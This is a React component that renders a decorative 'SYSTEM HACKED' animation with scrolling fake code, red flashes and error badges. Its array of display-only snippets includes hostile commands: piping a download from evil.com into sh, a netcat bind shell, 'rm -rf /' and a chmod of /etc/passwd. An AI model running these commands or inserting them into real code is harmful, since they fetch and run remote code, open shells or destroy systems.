"use client";

import { useEffect, useState, useRef, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import styles from "./SystemBreachEffect.module.css";

/**
 * SystemBreachEffect Component
 * 
 * Cinematic "System Hacked" transition effect with:
 * - Fast scrolling code lines
 * - Red blinking screen
 * - Screen shake
 * - "SYSTEM BREACH" reveal
 * - Error badges
 */

interface SystemBreachEffectProps {
    isActive: boolean;
    onComplete?: () => void;
    duration?: number; // Total duration in ms
}

// Fake code snippets for the scrolling effect
const CODE_SNIPPETS = [
    "if (PyBuffer_New()) {",
    "malloc(sizeof(struct));",
    "return exploit->execute();",
    "password = decrypt(hash);",
    "socket.connect(target);",
    "inject_payload(buffer);",
    "bypass_firewall(true);",
    "root_access = true;",
    "system(\"rm -rf /\");",
    "memcpy(dest, src, len);",
    "while (breach) { attack(); }",
    "ssh root@target -p 22;",
    "SELECT * FROM users;",
    "exec(shell_code);",
    "chmod 777 /etc/passwd;",
    "nc -lvp 4444 -e /bin/sh;",
    "import os; os.system();",
    "curl http://evil.com | sh;",
    "RSA_KEY = 0xDEADBEEF;",
    "for i in range(0xFFFF):",
];

export default function SystemBreachEffect({
    isActive,
    onComplete,
    duration = 3000,
}: SystemBreachEffectProps) {
    const [phase, setPhase] = useState<"idle" | "code" | "shake" | "reveal" | "complete">("idle");
    const [codeLines, setCodeLines] = useState<string[]>([]);
    const codeIntervalRef = useRef<NodeJS.Timeout | null>(null);
    const hasCompletedRef = useRef(false);

    // Generate random code line
    const generateCodeLine = useCallback(() => {
        const snippet = CODE_SNIPPETS[Math.floor(Math.random() * CODE_SNIPPETS.length)];
        const lineNum = Math.floor(Math.random() * 9999);
        return `[${lineNum.toString().padStart(4, '0')}] ${snippet}`;
    }, []);

    // Start effect when active
    useEffect(() => {
        if (!isActive || hasCompletedRef.current) return;

        // Phase 1: Fast scrolling code (0-1500ms)
        setPhase("code");
        codeIntervalRef.current = setInterval(() => {
            setCodeLines(prev => {
                const newLines = [...prev, generateCodeLine()];
                // Keep last 30 lines for performance
                return newLines.slice(-30);
            });
        }, 30); // Very fast - 30ms per line

        // Phase 2: Screen shake (2000-3000ms for 6s duration)
        const shakeTimer = setTimeout(() => {
            setPhase("shake");
        }, duration * 0.33);

        // Phase 3: Reveal message (3000-6000ms for 6s duration = 3 second reveal)
        const revealTimer = setTimeout(() => {
            if (codeIntervalRef.current) {
                clearInterval(codeIntervalRef.current);
            }
            setPhase("reveal");
        }, duration * 0.5);

        // Phase 4: Complete (3000ms)
        const completeTimer = setTimeout(() => {
            setPhase("complete");
            hasCompletedRef.current = true;
            onComplete?.();
        }, duration);

        return () => {
            if (codeIntervalRef.current) {
                clearInterval(codeIntervalRef.current);
            }
            clearTimeout(shakeTimer);
            clearTimeout(revealTimer);
            clearTimeout(completeTimer);
        };
    }, [isActive, duration, onComplete, generateCodeLine]);

    // Reset on deactivation
    useEffect(() => {
        if (!isActive) {
            setPhase("idle");
            setCodeLines([]);
            hasCompletedRef.current = false;
        }
    }, [isActive]);

    if (!isActive && phase === "idle") return null;

    return (
        <motion.div
            className={`${styles.container} ${phase === "shake" ? styles.shaking : ""}`}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
        >
            {/* Red overlay with blink */}
            <div className={`${styles.redOverlay} ${phase !== "idle" ? styles.active : ""}`} />

            {/* Scanlines */}
            <div className={styles.scanlines} />

            {/* Fast scrolling code */}
            <div className={styles.codeContainer}>
                <div className={styles.codeLeft}>
                    {codeLines.map((line, i) => (
                        <div key={i} className={styles.codeLine}>
                            {line}
                        </div>
                    ))}
                </div>
                <div className={styles.codeRight}>
                    {codeLines.slice().reverse().map((line, i) => (
                        <div key={i} className={styles.codeLine}>
                            {line}
                        </div>
                    ))}
                </div>
            </div>

            {/* Vertical code streams */}
            <div className={styles.codeStreams}>
                {Array.from({ length: 20 }).map((_, i) => (
                    <div
                        key={i}
                        className={styles.codeStream}
                        style={{
                            left: `${i * 5}%`,
                            animationDelay: `${Math.random() * 0.5}s`,
                            animationDuration: `${0.5 + Math.random() * 0.5}s`
                        }}
                    >
                        {Array.from({ length: 50 }).map((_, j) => (
                            <span key={j} className={styles.streamChar}>
                                {String.fromCharCode(33 + Math.floor(Math.random() * 94))}
                            </span>
                        ))}
                    </div>
                ))}
            </div>

            {/* Main breach message */}
            <AnimatePresence>
                {(phase === "reveal" || phase === "complete") && (
                    <motion.div
                        className={styles.breachContainer}
                        initial={{ scale: 0.5, opacity: 0 }}
                        animate={{ scale: 1, opacity: 1 }}
                        transition={{ type: "spring", damping: 10, stiffness: 200 }}
                    >
                        {/* Warning icon */}
                        <motion.div
                            className={styles.warningIcon}
                            animate={{ scale: [1, 1.1, 1] }}
                            transition={{ duration: 0.3, repeat: Infinity }}
                        >
                            ⚠
                        </motion.div>

                        {/* Main text */}
                        <h1 className={styles.breachTitle}>
                            <span className={styles.glitchText} data-text="SYSTEM">SYSTEM</span>
                            <br />
                            <span className={styles.glitchText} data-text="HACKED">HACKED</span>
                        </h1>

                        {/* Error badges */}
                        <div className={styles.errorBadges}>
                            <motion.div
                                className={styles.errorBadge}
                                initial={{ x: -100, opacity: 0 }}
                                animate={{ x: 0, opacity: 1 }}
                                transition={{ delay: 0.1 }}
                            >
                                ERROR
                            </motion.div>
                            <motion.div
                                className={styles.errorBadge}
                                initial={{ x: 100, opacity: 0 }}
                                animate={{ x: 0, opacity: 1 }}
                                transition={{ delay: 0.2 }}
                            >
                                CYBER ATTACK
                            </motion.div>
                        </div>

                        {/* Sub badges */}
                        <div className={styles.subBadges}>
                            <motion.div
                                className={styles.subBadge}
                                initial={{ y: 20, opacity: 0 }}
                                animate={{ y: 0, opacity: 1 }}
                                transition={{ delay: 0.3 }}
                            >
                                BREACH COMPLETE
                            </motion.div>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>

            {/* Corner error badges */}
            <AnimatePresence>
                {(phase === "shake" || phase === "reveal" || phase === "complete") && (
                    <>
                        <motion.div
                            className={`${styles.cornerBadge} ${styles.topLeft}`}
                            initial={{ opacity: 0, scale: 0 }}
                            animate={{ opacity: 1, scale: 1 }}
                            transition={{ delay: 0.1 }}
                        >
                            ERROR
                        </motion.div>
                        <motion.div
                            className={`${styles.cornerBadge} ${styles.topRight}`}
                            initial={{ opacity: 0, scale: 0 }}
                            animate={{ opacity: 1, scale: 1 }}
                            transition={{ delay: 0.2 }}
                        >
                            ERROR
                        </motion.div>
                        <motion.div
                            className={`${styles.cornerBadge} ${styles.bottomLeft}`}
                            initial={{ opacity: 0, scale: 0 }}
                            animate={{ opacity: 1, scale: 1 }}
                            transition={{ delay: 0.3 }}
                        >
                            ERROR
                        </motion.div>
                        <motion.div
                            className={`${styles.cornerBadge} ${styles.bottomRight}`}
                            initial={{ opacity: 0, scale: 0 }}
                            animate={{ opacity: 1, scale: 1 }}
                            transition={{ delay: 0.4 }}
                        >
                            ERROR
                        </motion.div>
                    </>
                )}
            </AnimatePresence>
        </motion.div>
    );
}
